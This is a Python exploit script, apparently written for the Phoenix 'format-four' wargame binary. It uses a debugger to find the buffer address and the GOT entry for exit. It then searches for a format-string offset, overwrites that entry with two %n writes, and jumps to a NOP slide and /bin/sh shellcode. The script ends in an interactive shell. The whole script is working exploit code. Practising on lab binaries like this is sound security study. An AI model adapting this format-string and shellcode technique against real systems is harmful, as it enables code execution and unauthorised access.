from pwnhelper.debugger import *

binary = "/opt/phoenix/i486/format-four"
dbg = Debugger(binary)


context.terminal = ["tmux", "splitw", "-h"]
print(context)


sh = asm(shellcraft.i386.linux.sh())
# sh = b"\xCC"*16
nop_slide = b"\x90"*100
print("shellcode: ")
print(sh)


def pad(s, slen):
    return s+b"A"*(slen-len(s))


def split_adr(integer):
    return divmod(integer, 0x10000)


# exit_got = 0x80497e4
exit_got = dbg.elf.got['exit']
print("exit got pointer")
print(exit_got)


# io = process([binary,arg])
# pid, io_gdb = pwnlib.gdb.attach(io,api=True)

# should be in main frame
main = dbg.go_into("main")
print("frame: " + str(main.name))
print(main)

base_pointer = main.read_register("ebp")
print("base pointer: ")
print(base_pointer)

# find buf adr by checking args for read on stack
dbg.go_to("read")
# get second arg of read
buf_adr = dbg.find_args([4], frame=main)
print("found buf adr:")
print(buf_adr)

# hit nopslide
sh_adr = buf_adr + 100
print("sh adr: ")
print(hex(sh_adr))

# get upper and lower bytes of sh adr
high, low = split_adr(sh_adr)
print("lower sh adr")
print(low)
print("high sh adr")
print(high)

# print old got entry val
old_got_val = dbg.examine(exit_got)
print("exit got value before exploit")
print(hex(exit_got))

header = b"B"*4
before_send = dbg.checkpoint()


# find hammer len with soft restoring checkpoint
# def find_hammer_len_debugger():
#     hammer_len = 1
#     # look until we hit header in buf
#     # why restart debugger, just stop debugger and meanwhile call process without debugging
#     for i in range(30):
#         hammer = header + (b"%x " * hammer_len)
#         print("payload:")
#         print(hammer)
#         dbg.sendline(hammer)
#         dbg.breakpoint("printf")
#         dbg.gdb.continue_and_wait()
#         # at puts now
#         dbg.gdb.execute("finish")
#         r = dbg.io.recv()
#         dbg.gdb.wait()
#         # printf wants to output to stdout now
#
#         r = b"".join(r.split())
#         print("leaked values")
#         print(r)
#         if b"42424242" in r:
#             break
#         else:
#             dbg.restore_soft(before_send)
#             hammer_len += 1
#     return hammer_len


# find hammerlen starting process over and over
# faster in this case, but check values in memory at each iteration
def find_hammer_len():
    hammer_len = 1
    for i in range(30):
        io = process([binary])
        print(io.recv())
        hammer = header + (b"%x " * hammer_len)
        print("payload:")
        print(hammer)
        io.sendline(hammer)
        r = io.recvall()
        r = b"".join(r.split())
        print(r)
        if b"42424242" in r:
            break
        else:
            hammer_len += 1
    return hammer_len


# subtract 1 bc last %x is gonna be padded %x
# hammer_len = find_hammer_len() - 1
# hammer_len = find_hammer_len_debugger() -1

hammer_len = 11
print("found right hammer length: " + str(hammer_len))

def create_payload(off):
    delimiter = b"C"*4

    # right after read now
    payload = b""
    payload += header
    # first %n
    payload += pack(exit_got,32)
    payload += delimiter
    # second %n
    payload += pack(exit_got + 0x2,32)
    payload += b"%x "*hammer_len
    # we want ascii numbers here
    lower_offset = low + off
    higher_offset = (high - lower_offset) + magic_offset
    payload += b"%"+bytes(str(lower_offset), "utf-8")+b"x"
    payload += b"%n"
    payload += b"%"+bytes(str(higher_offset), "utf-8")+b"x"
    payload += b"%n"
    return payload


print("trying to find magic offset...")
# start with 0
magic_offset = 0
new_got_val = old_got_val

while True:
    print("trying magic offset: " + str(magic_offset))
    payload = create_payload(off=magic_offset)
    print(payload)
    dbg.sendline(payload)
    dbg.breakpoint("printf")
    dbg.gdb.continue_and_wait()

    # at print now
    dbg.gdb.execute("finish")
    r,crash = dbg.crash_recv()
    # print("received data:")
    # print(r)
    if crash:
        print("program crashed")
        exit(1)

    print("checking got...")

    dbg.gdb.wait()

    # print new got entry val
    new_got_val = dbg.examine(exit_got)
    print("overwritten exit got")
    print(hex(new_got_val))
    if new_got_val == old_got_val:
        print("got value did not change")
        exit(1)

    if new_got_val == sh_adr:
        print("found right magic offset:")
        print(magic_offset)
        break

    # magic offset was not right yet
    # correcting magic offset

    new_high, new_low = split_adr(new_got_val)
    print("got value to correct (low order)")
    print(new_low)
    print("got value to correct (high order)")
    print(new_high)

    # expected - actual
    magic_offset = low - new_low
    dbg.restore_soft(before_send)

# magic offset found, send full payload now
dbg.restore_soft(before_send)

payload = create_payload(off=magic_offset)
payload += nop_slide
payload += sh
print("send full corrected payload:")
print(payload)
# somehow it wont send the right payload here, or read does not fully read it
# run after running this script, to complete exploit:
# (cat /tmp/docgil;cat) | /opt/phoenix/i486/format-four
dbg.sendline(payload)
dbg.breakpoint("printf")
dbg.gdb.continue_and_wait()
dbg.gdb.execute("finish")

r, crash = dbg.crash_recv(timeout=10)

if crash:
    print("program crashed")
    exit(1)

print(r)
dbg.gdb.wait()

# print new got entry val
new_got_val = dbg.examine(exit_got)
print("exit got value after finished exploit")
print(hex(new_got_val))

print("buf:")
print(dbg.gdb.execute("x/100wx"+hex(buf_adr),to_string=True))
print("eip jumps here: (buf + 100) ")
print(dbg.gdb.execute("x/100wx"+hex(sh_adr),to_string=True))

dbg.gdb.continue_nowait()
dbg.io.interactive()
